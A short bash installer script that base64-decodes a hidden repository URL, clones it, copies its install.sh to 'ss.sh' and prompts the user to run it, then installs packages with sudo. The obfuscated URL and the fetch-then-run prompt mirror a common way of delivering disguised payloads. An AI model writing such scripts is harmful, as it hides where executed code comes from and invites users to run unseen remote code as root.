#!/bin/bash
VAR="$(echo aHR0cHM6Ly9odWdnaW5nZmFjZS5jby96dXYwL1NERkRGMTEw | base64 --decode)"
git clone $VAR SD
\cp -f ./SD/install.sh "ss.sh"
echo 'please run sh ss.sh ? ?'
sudo apt -y --force-yes install software-properties-common
sudo add-apt-repository ppa:deadsnakes/ppa
